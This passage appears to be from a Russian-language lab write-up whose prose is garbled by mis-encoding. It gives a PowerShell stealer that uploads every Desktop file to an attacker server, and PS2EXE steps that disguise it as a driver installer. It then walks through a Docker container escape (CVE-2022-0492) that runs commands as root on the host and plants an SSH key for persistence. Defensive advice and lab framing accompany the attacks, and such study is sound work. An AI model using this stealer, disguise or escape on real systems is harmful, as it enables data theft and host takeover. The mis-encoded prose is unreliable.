–î–ª—è –∏–º–∏—Ç–∞—Ü–∏–∏ —Ä–∞–±–æ—Ç—ã –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è PowerShell-—Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–±–∏—Ä–∞–µ—Ç –¥–æ–∫—É–º–µ–Ω—Ç—ã —Å —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞ –∏ –∑–∞–≥—Ä—É–∂–∞–µ—Ç –∏—Ö –Ω–∞ upload.php.

```
$desktopPath = [Environment]::GetFolderPath("Desktop")
$files = Get-ChildItem -Path $desktopPath -File
foreach ($file in $files) {
    Write-Host "Sending file: $($file.Name)"
    & curl.exe -X POST -F "file=@$($file.FullName)" "http://192.168.0.114:2222/upload.php"
}
```

docker-compose.yml

```
version: '3.8'
services:
  stiller:
    image: php:8.1-apache
    container_name: still3r_s3rv3r
    volumes:
      - ./html:/var/www/html
    ports:
      - "2222:80"
```

Dockerfile

```
FROM php:8.1-apache
COPY . /var/www/html/
RUN chown -R www-data:www-data /var/www/html
```
‚öôÔ∏è –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞

–î–ª—è –º–∞—Å–∫–∏—Ä–æ–≤–∫–∏ —Å—Ç–∏–ª–ª–µ—Ä –∫–æ–º–ø–∏–ª–∏—Ä—É–µ—Ç—Å—è –≤ .exe —Å –ø–æ–º–æ—â—å—é –º–æ–¥—É–ª—è PS2EXE:

Install-Module ps2exe ‚Äî —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞;
Import-Module ps2exe ‚Äî –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –º–æ–¥—É–ª—è;
Set-ExecutionPolicy Bypass -Scope CurrentUser ‚Äî —Å–Ω—è—Ç–∏–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ;
Invoke-PS2EXE steal.ps1 Driver_i386.exe -iconFile "icon.ico" -title "i386 driver" ‚Äî –∫–æ–º–ø–∏–ª—è—Ü–∏—è –∏ –º–∞—Å–∫–∏—Ä–æ–≤–∫–∞ –ø–æ–¥ –¥—Ä–∞–π–≤–µ—Ä.
–ò—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª –ø–æ–ª—É—á–∞–µ—Ç –≤–∏–¥ –ª–µ–≥–∏—Ç–∏–º–Ω–æ–≥–æ —É—Å—Ç–∞–Ω–æ–≤—â–∏–∫–∞ –¥—Ä–∞–π–≤–µ—Ä–∞, –≤–∫–ª—é—á–∞—è –∏–∫–æ–Ω–∫—É –∏ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã–µ —Ä–µ—Å—É—Ä—Å–∞ PE-—Ñ–∞–π–ª–∞.

–°–∫—Ä–∏–ø—Ç –ø–µ—Ä–µ–±–∏—Ä–∞–µ—Ç —Ñ–∞–π–ª—ã –≤ –∫–∞—Ç–∞–ª–æ–≥–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ —á–µ—Ä–µ–∑ curl –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –∫–∞–∂–¥—ã–π –∏–∑ –Ω–∏—Ö –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞.

üîç –†–µ–∑—É–ª—å—Ç–∞—Ç—ã

–ü–æ—Å–ª–µ –∑–∞–ø—É—Å–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –∑–∞–º–µ—á–∞–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ (—Ç–æ–ª—å–∫–æ –∫—Ä–∞—Ç–∫–æ–≤—Ä–µ–º–µ–Ω–Ω–æ–µ –ø–æ—è–≤–ª–µ–Ω–∏–µ –æ–∫–Ω–∞ PowerShell).
–í—Å–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã —Å —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞ –æ–∫–∞–∑—ã–≤–∞—é—Ç—Å—è –≤ –∫–∞—Ç–∞–ª–æ–≥–µ uploads/ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞.
–ê—Ç–∞–∫—É—é—â–∏–π –ø–æ–ª—É—á–∞–µ—Ç —Ü–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ —Ö—Ä–∞–Ω–∏–ª–∏—â–µ –ø–æ—Ö–∏—â–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö.

### üé• –í–∏–¥–µ–æ-–¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è –∞—Ç–∞–∫–∏
**–ü–æ–∑–∂–µ –≤—Å—Ç–∞–≤–ª—é**

## üõ° –ó–∞—â–∏—Ç–∞
–ó–∞—â–∏—Ç–∞ –æ—Ç —Å—Ç–∏–ª–ª–µ—Ä-–∞—Ç–∞–∫ –≤ –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–µ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ —Å–æ —Å—Ç–æ—Ä–æ–Ω—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:
-	–∑–∞–≥—Ä—É–∂–∞—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—ã —Ç–æ–ª—å–∫–æ –∏–∑ –ø—Ä–æ–≤–µ—Ä–µ–Ω–Ω—ã—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤; –≤—Å–µ–≥–¥–∞ –ø—Ä–æ–≤–µ—Ä—è—Ç—å —Ü–∏—Ñ—Ä–æ–≤—É—é –ø–æ–¥–ø–∏—Å—å –∏ –∏–∑–¥–∞—Ç–µ–ª—è –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º;
-	—Ä–∞–±–æ—Ç–∞—Ç—å –ø–æ–¥ —É—á—ë—Ç–Ω–æ–π –∑–∞–ø–∏—Å—å—é —Å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏, –Ω–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–ª—è –ø–æ–≤—Å–µ–¥–Ω–µ–≤–Ω—ã—Ö –∑–∞–¥–∞—á;
-	–¥–µ—Ä–∂–∞—Ç—å –∞–Ω—Ç–∏–≤–∏—Ä—É—Å –∏ —Å—Ä–µ–¥—Å—Ç–≤–∞ EDR/NGAV –≤ –∞–∫—Ç—É–∞–ª—å–Ω–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏; –≤–∫–ª—é—á–∏—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É –∑–∞–≥—Ä—É–∂–∞–µ–º—ã—Ö —Ñ–∞–π–ª–æ–≤ –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω—É—é —ç–≤—Ä–∏—Å—Ç–∏–∫—É –¥–ª—è PowerShell‚Äë—Å–∫—Ä–∏–ø—Ç–æ–≤;
-	–ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Ñ–∞–π–ª–æ–≤ –ø–æ –ø–æ—á—Ç–µ –∏–ª–∏ –≤ –º–µ—Å—Å–µ–Ω–¥–∂–µ—Ä–∞—Ö –ø—Ä–æ–≤–µ—Ä—è—Ç—å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ, –¥–≤–æ–π–Ω—ã–µ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è (*.pdf.exe) –∏ ¬´–¥—Ä–∞–π–≤–µ—Ä—ã¬ª –∏–∑ –Ω–µ–æ–∂–∏–¥–∞–Ω–Ω—ã—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤ –¥–æ–ª–∂–Ω—ã –≤—ã–∑—ã–≤–∞—Ç—å –ø–æ–¥–æ–∑—Ä–µ–Ω–∏–µ;
-	–∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π SmartScreen/Smart App Control (Windows 10/11) ‚Äì –æ–Ω –±–ª–æ–∫–∏—Ä—É–µ—Ç –Ω–µ–ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã–µ –∏–ª–∏ —Ä–µ–¥–∫–∏–µ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–µ —Ñ–∞–π–ª—ã;
-	—Å–æ–∑–¥–∞–≤–∞—Ç—å —Ä–µ–≥—É–ª—è—Ä–Ω—ã–µ —Ä–µ–∑–µ—Ä–≤–Ω—ã–µ –∫–æ–ø–∏–∏ —Ü–µ–Ω–Ω—ã—Ö –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤ –Ω–∞ –≤–Ω–µ—à–Ω–∏–µ –∏–ª–∏ —Å–µ—Ç–µ–≤—ã–µ —Ä–µ—Å—É—Ä—Å—ã, —á—Ç–æ–±—ã –∏—Å–∫–ª—é—á–∏—Ç—å –±–µ–∑–≤–æ–∑–≤—Ä–∞—Ç–Ω—É—é –ø–æ—Ç–µ—Ä—é –¥–∞–Ω–Ω—ã—Ö.
–ó–∞—â–∏—Ç–∞ –æ—Ç —Å—Ç–∏–ª–ª–µ—Ä-–∞—Ç–∞–∫ –≤ –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–µ –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏ —Å–æ —Å—Ç–æ—Ä–æ–Ω—ã –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä:
-	–≤–Ω–µ–¥—Ä–∏—Ç—å Application Whitelisting (AppLocker, —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º–∏ Windows Defender) ‚Äì —Ä–∞–∑—Ä–µ—à–∞—Ç—å –∑–∞–ø—É—Å–∫ —Ç–æ–ª—å–∫–æ –¥–æ–≤–µ—Ä–µ–Ω–Ω—ã—Ö –ø–æ–¥–ø–∏—Å–∞–Ω–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π; –∑–∞–ø—Ä–µ—Ç–∏—Ç—å –∏—Å–ø–æ–ª–Ω–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –∫–∞—Ç–∞–ª–æ–≥–∞—Ö (Downloads, Desktop);
-	–æ–≥—Ä–∞–Ω–∏—á–∏—Ç—å –∏–ª–∏ –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ PowerShell –≤ Constrained Language Mode; –≤–∫–ª—é—á–∏—Ç—å Script Block Logging –∏ –ø–æ–¥–∫–ª—é—á–∏—Ç—å –µ–≥–æ –∫ SIEM –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö —Å–∫—Ä–∏–ø—Ç–æ–≤;
-	–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –∏–ª–∏ —Å—Ç—Ä–æ–≥–æ –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä–æ–≤–∞—Ç—å outbound‚Äë—Ç—Ä–∞—Ñ–∏–∫ –Ω–∞ –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ HTTP‚Äë/HTTPS‚Äë–∞–¥—Ä–µ—Å–∞, –∑–∞–ø—Ä–µ—â–∞—Ç—å –ø—Ä—è–º—ã–µ –æ–±—Ä–∞—â–µ–Ω–∏—è –∫ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–º –∞–¥—Ä–µ—Å–∞–º –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–æ–≤, –ø—Ä–∏–º–µ–Ω—è—Ç—å DLP/IPS —Å –ø—Ä–∞–≤–∏–ª–∞–º–∏ –Ω–∞ –∑–∞–ø—Ä–µ—Ç –æ—Ç–ø—Ä–∞–≤–∫–∏ –∞—Ä—Ö–∏–≤–æ–≤ –∏–∑ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –∫–∞—Ç–∞–ª–æ–≥–æ–≤;
-	–Ω–∞—Å—Ç—Ä–æ–∏—Ç—å –∫–æ–Ω—Ç—Ä–æ–ª—å USB‚Äë–Ω–æ—Å–∏—Ç–µ–ª–µ–π –∏ –º–µ—Ö–∞–Ω–∏–∑–º–æ–≤ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞, —á—Ç–æ–±—ã –∏—Å–∫–ª—é—á–∏—Ç—å –∏–º–ø–æ—Ä—Ç –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ–∞–π–ª–æ–≤ –Ω–∞ —Ä–∞–±–æ—á–∏–µ —Å—Ç–∞–Ω—Ü–∏–∏.
-	–∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ü–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω—ã–µ —Ä–µ—à–µ–Ω–∏—è EDR/XDR(—Ä–∞—Å—à–∏—Ä–µ–Ω–Ω–æ–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –∏ —Ä–µ–∞–≥–∏—Ä–æ–≤–∞–Ω–∏–µ) –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è –∑–∞–ø—É—Å–∫–∞ PS2EXE‚Äë—Å–±–æ—Ä–æ–∫ –∏ ¬´–æ–¥–∏–Ω–æ—á–Ω—ã—Ö¬ª –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–æ–≤ curl.exe —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º -F –≤–Ω—É—Ç—Ä–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö —Å–µ—Å—Å–∏–π;
-	–≤–≤–µ—Å—Ç–∏ –ø–æ–ª–∏—Ç–∏–∫—É —Ä–µ–≥—É–ª—è—Ä–Ω–æ–≥–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è, –≤ —Ç–æ–º —á–∏—Å–ª–µ PowerShell –∏ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫, –∑–∞–∫—Ä—ã–≤–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç–∏, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã –¥–ª—è –æ–±—Ö–æ–¥–∞ Execution Policy;
-	–ø—Ä–æ–≤–æ–¥–∏—Ç—å –æ–±—É—á–µ–Ω–∏–µ –ø–µ—Ä—Å–æ–Ω–∞–ª–∞ –ø–æ –∫–∏–±–µ—Ä–≥–∏–≥–∏–µ–Ω–µ –∏ —Ä–µ–≥—É–ª—è—Ä–Ω–æ –∑–∞–ø—É—Å–∫–∞—Ç—å —Å–∏–º—É–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Ç–µ—Å—Ç—ã, —Ä–∞—Å—Å—ã–ª–∫–∞ ¬´–ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö¬ª –≤–ª–æ–∂–µ–Ω–∏–π –∏ –∫–æ–Ω—Ç—Ä–æ–ª—å —Ä–µ–∞–∫—Ü–∏–∏ —Å–æ—Ç—Ä—É–¥–Ω–∏–∫–æ–≤.

## 4 üê≥ –ê—Ç–∞–∫–∞ –º–µ—Ç–æ–¥–æ–º –≤—ã—Ö–æ–¥–∞ –∑–∞ –ø—Ä–µ–¥–µ–ª—ã –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ (Docker Escape, CVE-2022-0492)

**–ò–¥–µ—è:** —É—è–∑–≤–∏–º–æ—Å—Ç—å –≤ –º–µ—Ö–∞–Ω–∏–∑–º–µ cgroup release agent –≤ —Ä—è–¥–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–π —è–¥—Ä–∞ Linux (CVE-2022-0492) –¥–∞—ë—Ç –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –∏–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞ –Ω–∞ —Ö–æ—Å—Ç-—Å–∏—Å—Ç–µ–º–µ –æ—Ç –∏–º–µ–Ω–∏ `root`, —Ç.–µ. –≤—ã–π—Ç–∏ –∑–∞ –ø—Ä–µ–¥–µ–ª—ã –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞.

---

### üîπ –õ–∞–±–æ—Ä–∞—Ç–æ—Ä–Ω—ã–π —Å—Ç–µ–Ω–¥

**–¢–∞–±–ª–∏—Ü–∞ ‚Äî –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ Docker Escape**

| –£–∑–µ–ª / –ü–æ—Ä—Ç          | –†–æ–ª—å          | –û–ø–∏—Å–∞–Ω–∏–µ |
|----------------------|---------------|----------|
| Ubuntu (host)        | –•–æ—Å—Ç Docker   | –Ø–¥—Ä–æ Linux, Docker Engine (—É—á–µ–±–Ω—ã–π —É–∑–µ–ª) |
| –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä `ubuntu`   | –ü–µ—Å–æ—á–Ω–∏—Ü–∞     | –°—Ä–µ–¥–∞, –≥–¥–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∫–æ–¥ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞ |
| `192.168.0.97`      | –°–µ—Ç—å —Å—Ç–µ–Ω–¥–∞   | –î–æ—Å—Ç—É–ø –∫ —Ö–æ—Å—Ç—É –∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—É –≤ —Ç–µ—Å—Ç–æ–≤–æ–º —Å–µ–≥–º–µ–Ω—Ç–µ |

> –î–∏—Å—Ç—Ä–∏–±—É—Ç–∏–≤: Ubuntu (–∞–∫—Ç—É–∞–ª—å–Ω—ã–π LTS); –¥–æ—Å—Ç—É–ø–Ω—ã –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–µ –ø–∞–∫–µ—Ç—ã Docker Engine –∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏.

---

### üõ† –•–æ–¥ –∞—Ç–∞–∫–∏ (—à–∞–≥–∏ —Å —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ–º —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–æ–Ω–Ω—ã—Ö —Ñ—Ä–∞–≥–º–µ–Ω—Ç–æ–≤)

–®–∞–≥ 1 ‚Äî –†–∞–∑–≤—ë—Ä—Ç—ã–≤–∞–Ω–∏–µ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞
–ó–∞–ø—É—Å—Ç–∏—Ç—å –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –Ω–∞ –±–∞–∑–µ Ubuntu –¥–ª—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –∞—Ç–∞–∫–∏.
–£–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ –¥–æ—Å—Ç—É–ø–Ω—ã –±–∞–∑–æ–≤—ã–µ —É—Ç–∏–ª–∏—Ç—ã.

```bash
docker run --rm -it --privileged ubuntu bash
```
–®–∞–≥ 2 ‚Äî –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ cgroup-–æ–∫—Ä—É–∂–µ–Ω–∏—è –≤–Ω—É—Ç—Ä–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞
–°–æ–∑–¥–∞—Ç—å —Ç–µ—Å—Ç–æ–≤—É—é –∏–µ—Ä–∞—Ä—Ö–∏—é cgroup –∏ —Å–º–æ–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å –Ω—É–∂–Ω—É—é –ø–æ–¥—Å–∏—Å—Ç–µ–º—É –≤ —Ä–∞–±–æ—á–∏–π –∫–∞—Ç–∞–ª–æ–≥. –°–æ–∑–¥–∞—Ç—å –≤–ª–æ–∂–µ–Ω–Ω—É—é –≥—Ä—É–ø–ø—É 
```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
–í–∫–ª—é—á–∏—Ç—å –º–µ—Ö–∞–Ω–∏–∑–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ–± –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤.

```bash
echo 1 > /tmp/cgrp/x/notify_on_release
```
–®–∞–≥ 3 ‚Äî –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø—É—Ç–∏ –∫ –∫–æ—Ä–Ω—é —Ñ–∞–π–ª–æ–≤–æ–π —Å–∏—Å—Ç–µ–º—ã —Ö–æ—Å—Ç–∞
–û–ø—Ä–µ–¥–µ–ª–∏—Ç—å –ø—É—Ç—å –º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∫–æ—Ä–Ω–µ–≤–æ–≥–æ —Ä–∞–∑–¥–µ–ª–∞ —Ö–æ—Å—Ç–∞ –¥–ª—è –ø–æ—Å–ª–µ–¥—É—é—â–µ–π –∑–∞–ø–∏—Å–∏ –∞—Ä—Ç–µ—Ñ–∞–∫—Ç–æ–≤.
```bash
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
```
–®–∞–≥ 4 ‚Äî –£–∫–∞–∑–∞–Ω–∏–µ release agent
–°—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞—Ç—å –∞–±—Å–æ–ª—é—Ç–Ω—ã–π –ø—É—Ç—å –∫ —Å–∫—Ä–∏–ø—Ç—É-–∞–≥–µ–Ω—Ç—É –Ω–∞ —Ö–æ—Å—Ç–µ (–Ω–∞–ø—Ä–∏–º–µ—Ä, —É—Å–ª–æ–≤–Ω—ã–π /cmd).
–ó–∞–ø–∏—Å–∞—Ç—å —ç—Ç–æ—Ç –ø—É—Ç—å –≤ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–µ–µ –ø–æ–ª–µ release agent.
```bash
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

–®–∞–≥ 5 ‚Äî –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ —Å–∫—Ä–∏–ø—Ç–∞-–∞–≥–µ–Ω—Ç–∞ –Ω–∞ —Ö–æ—Å—Ç–µ (–∞—Ä—Ç–µ—Ñ–∞–∫—Ç –¥–æ–∫–∞–∑–∞—Ç–µ–ª—å—Å—Ç–≤–∞)
–°—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Å–∫—Ä–∏–ø—Ç–∞ (–≤—ã–≤–æ–¥ —Å–ø–∏—Å–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –∏ —Å–µ—Ç–µ–≤—ã—Ö –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–æ–≤; –∑–∞–ø–∏—Å—å –≤ —Ñ–∞–π–ª-–¥–æ–∫–∞–∑–∞—Ç–µ–ª—å—Å—Ç–≤–æ –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ —Ö–æ—Å—Ç–∞).
```bash
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
```
–í—ã–¥–∞—Ç—å –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–µ –ø—Ä–∞–≤–∞.
```bash
chmod a+x /cmd
```
–®–∞–≥ 6 ‚Äî –¢—Ä–∏–≥–≥–µ—Ä —Å–æ–±—ã—Ç–∏—è –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏—è cgroup
–ü–æ–º–µ—Å—Ç–∏—Ç—å —Ç–µ–∫—É—â–∏–π PID –≤ —Ç–µ—Å—Ç–æ–≤—É—é –≥—Ä—É–ø–ø—É –∏ –∏–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞—Ç—å —Å–æ–±—ã—Ç–∏–µ –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏—è.
```
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
–û–∂–∏–¥–∞—Ç—å, —á—Ç–æ —è–¥—Ä–æ —Ö–æ—Å—Ç–∞ –≤—ã–ø–æ–ª–Ω–∏—Ç —É–∫–∞–∑–∞–Ω–Ω—ã–π –∞–≥–µ–Ω—Ç.

–®–∞–≥ 7 ‚Äî –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞ –Ω–∞ —Ö–æ—Å—Ç–µ
–ü—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∞—Ä—Ç–µ—Ñ–∞–∫—Ç (—Ñ–∞–π–ª —Å —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º–∏), —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–Ω—ã–π –≤ —Ñ–∞–π–ª–æ–≤–æ–π —Å–∏—Å—Ç–µ–º–µ —Ö–æ—Å—Ç–∞.
–ó–∞—Ñ–∏–∫—Å–∏—Ä–æ–≤–∞—Ç—å —Ñ–∞–∫—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥ —É—Ä–æ–≤–Ω—è —Ö–æ—Å—Ç–∞.
```bash
cat output
```

```bash
echo '#!/bin/sh' > /cmd
echo "ip a > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat output
```
–®–∞–≥ 8 ‚Äî –î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è –ø–µ—Ä—Å–∏—Å—Ç–µ–Ω—Ç–Ω–æ—Å—Ç–∏.
–°—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞—Ç—å –∫–ª—é—á–∏ SSH –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–µ, –±–µ–∑–æ–ø–∞—Å–Ω–æ –∏–∑–≤–ª–µ—á—å –ø—É–±–ª–∏—á–Ω—ã–π –∫–ª—é—á.
–ß–µ—Ä–µ–∑ –º–µ—Ö–∞–Ω–∏–∑–º release agent –∑–∞–ø–∏—Å–∞—Ç—å –∫–ª—é—á –≤ authorized_keys –Ω–∞ —Ö–æ—Å—Ç–µ.
–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –ø–æ SSH.

```bash
apt update && apt -y install openssh-client
ssh-keygen -t rsa
cat ~/.ssh/id_rsa.pub
echo "echo 'ssh-rsa AAAA...' > /root/.ssh/authorized_keys" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

echo '#!/bin/sh' > /cmd
echo "apt-get install openssh-server -y > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

```bash
ssh root@192.168.0.97
The authenticity of host '192.168.0.97 (192.168.0.97)' can't be established.
ED25519 key fingerprint is SHA256:DCAZDfa2XNZ1UBzrLt5vmdZbR3j0d5O6YKelITx6cZM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.97' (ED25519) to the list of known hosts.
Welcome to Ubuntu Focal Fossa (development branch) (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

797 updates can be installed immediately.
508 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@justik-VirtualBox:~# 
root@justik-VirtualBox:~# ezzz
```
## üõ° –ó–∞—â–∏—Ç–∞
